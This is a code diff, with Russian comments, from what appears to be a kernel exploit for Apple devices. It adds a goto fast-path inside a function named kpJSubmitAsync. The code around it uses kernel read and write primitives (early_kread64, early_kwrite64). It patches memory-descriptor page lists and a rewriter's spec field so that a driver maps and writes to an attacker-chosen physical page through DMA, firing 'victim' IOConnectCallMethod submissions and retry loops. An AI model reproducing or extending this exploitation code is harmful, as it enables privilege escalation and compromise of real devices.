@@ -6709,6 +6709,19 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             }
         }
     }
+    // 1.9.262: FAST-PATH — CHAIN вооружён (nDep>0) → прыгаем поверх всей
+    // диагностической середины (зависание 262-го в SPC-fallback + окно мины):
+    // прямо victim#1 → retry. Хоистим объявления, чьи присвоения живут в
+    // пропускаемом спане (прыжок покрывает только C-типы; ObjC-временные
+    // остаются внутри вложенных блоков — ARC-safe).
+    uint64_t vaFldObj = 0, vaFldOld = 0; uint32_t vaFldOff = 0;
+    uint64_t parHitArr = 0, parHitOld = 0; uint32_t parHitOff = 0;
+    uint64_t ownHitArr = 0, ownHitOld = 0; uint32_t ownHitOff = 0;
+    uint64_t rmdHitArr = 0, rmdHitOld = 0; uint32_t rmdHitOff = 0;
+    uint64_t specVA[8] = {0}, specOld[8] = {0}; int nSpec = 0;
+    int changed = 0;
+    if (nDep) goto kpx_submit1;
+
     // 1.9.244: РАННИЙ ПАТЧ — page-0 записи page-list из SCAN A (найдены до любого
     // submit, до 9+ секунд DEP-скана = вне окна мины). zone-VA по значению хита
     // (physmap-записей ноль — урок 220/242), классификатор зоны р.59 в лог,
@@ -6880,8 +6893,6 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // пикселей dst (контент-проверка, walker не нужен) и подменяем на ctlKVA:
     // prepare посчитает vtophys(ctlKVA)=ctlPA и драйвер сам запишет PTE.
     // Оригинал возвращаем после execute (teardown-safety).
-    uint64_t vaFldObj = 0, vaFldOld = 0;
-    uint32_t vaFldOff = 0;
     kpNote(r, @"  [PH] VAD (VA-field deputy) — старт");   // 1.9.244 крошка фаз
     if (ctlKVA) {
         uint64_t pd198 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;   // plane(+0x30) — как в pd-дампе
@@ -6968,8 +6979,6 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // (lvl1-дамп: [+0x60]=arr, count=16384) в обычной VMEM-полосе (не physmap!).
     // Prepare перестраивает sub-MD из родителя — патчим запись арены с нашим
     // backingPA на ctlPA, и драйвер сам построит PTE. Оригинал вернём после execute.
-    uint64_t parHitArr = 0, parHitOld = 0;
-    uint32_t parHitOff = 0;
     kpNote(r, @"  [PH] PAR (parent-ranges) — старт");   // 1.9.244 крошка фаз
     {
         uint64_t pd202 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
@@ -7101,8 +7110,6 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // B: [pd+0x90]→+0x10=records→record[0]+0x00 = owner-MD — его ranges держат
     // базу == backingPA; патчим её на ctlPA (plain data, без PAC) → rewriter
     // 0x86eb7cc скопирует в desc+0x9c при execute → DART замапит ctlPA.
-    uint64_t ownHitArr = 0, ownHitOld = 0;
-    uint32_t ownHitOff = 0;
     kpNote(r, @"  [PH] OWN (owner-MD база) — старт");   // 1.9.244 крошка фаз
     {
         uint64_t pd207 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
@@ -7170,8 +7177,6 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // rewriter'а). Путь: [surf+0x30] plane sub-MD → [+0x60] родитель (root MD) →
     // его указатели/массивы → запись == backingPA>>14 → ctlPFN. Без frame-type
     // лотереи — прямо по цепочке объектов.
-    uint64_t rmdHitArr = 0, rmdHitOld = 0;
-    uint32_t rmdHitOff = 0;
     kpNote(r, @"  [PH] RMD (root-MD page-list) — старт");   // 1.9.244 крошка фаз
     {
         uint64_t pd211 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
@@ -7268,6 +7273,9 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // пробрасывается → ldr по НЕмапнутому cmd → NULL deref) — srcBad/уронить-map
     // ЗАПРЕЩЕНЫ. victim#1 = НАСТОЯЩИЙ src: валидный identity-оп, mapping кэшится
     // НА PIPE (не op-entry). DVA потом берём прямо оттуда.
+    // 1.9.262 fast-path: сюда прыгаем из CHAIN при nDep>0 (вся середина — только
+    // когда CHAIN мимо: диагностика целиком, потом тот же submit/retry).
+kpx_submit1: ;
     uint8_t tsdV[0x1B0];
     memcpy(tsdV, tsdGood, sizeof(tsdV));
     *(uint32_t *)(tsdV + 0) = srcID;
@@ -7275,12 +7283,12 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     *(uint64_t *)(tsdV + 8) = 1;   // async
     kern_return_t avkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
     kpNote(r, [NSString stringWithFormat:@"  victim#1 async submit (real src): kr=0x%x — mapping кэшируется на pipe", avkr]);
+    if (nDep) goto kpx_retry;   // 1.9.262 fast-path: CHAIN вооружён — SPC/SCAN B/цепи не нужны
     // 1.9.222: SPEC-яд — голый pfn32 по +0x58 = ranges-spec rewriter'а (р.52/55:
     // ldr w8,[x22,#0x58] → desc+0x9c). ПРЯМОЙ ПУТЬ (р.55): spec = [planeDesc+0x60],
     // заполняется РАЗ при create, per-execute лишь перечитывается — патч стабилен.
     // Все откаты: rewriter брал pfn из нетронутого spec+0x58. Выигрыш 1.9.207 — он.
-    uint64_t specVA[8], specOld[8];
-    int nSpec = 0;
+    // 1.9.262: specVA/specOld/nSpec хоиснуты в fast-path блок (там же changed).
     {
         uint64_t pdS = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
         uint64_t specS = (kpLooksLikeKernelPointer(pdS) && kpSafeToRead(pdS)) ? kp_untag_ptr(early_kread64(pdS + 0x60)) : 0;
@@ -7706,7 +7714,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     }
     kpNote(r, @"  жду execute victim-опа (backlog ~800 async)…");
     usleep(400000);   // backlog drains → victim executes → DMA
-    int changed = 0;
+    changed = 0;   // 1.9.262: объявление хоиснуто в fast-path блок (6722)
     for (uint32_t i = 0; i < 0x4000; i += 4) {
         uint32_t px = *(volatile uint32_t *)(ctl + i);
         if (px != 0xCCCCCCCC && px != 0) { changed++; if (changed <= 4) kpNote(r, [NSString stringWithFormat:@"    ctl+%#x: %#010x", i, px]); }
@@ -7885,6 +7893,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // 1.9.219: retry ×3 (было 8 — меньше окно яда и нагрузка на мину); форма4 из
     // массива уже нет; DEP-хиты восстанавливаем после КАЖДОЙ попытки (яд живёт
     // только в окне execute, не секундами — урок prev-12).
+kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо в retry
     for (int attempt = 1; !changed && attempt < 4; attempt++) {
         for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], newQs[j]);
         for (int k = 0; k < nSpec; k++) {
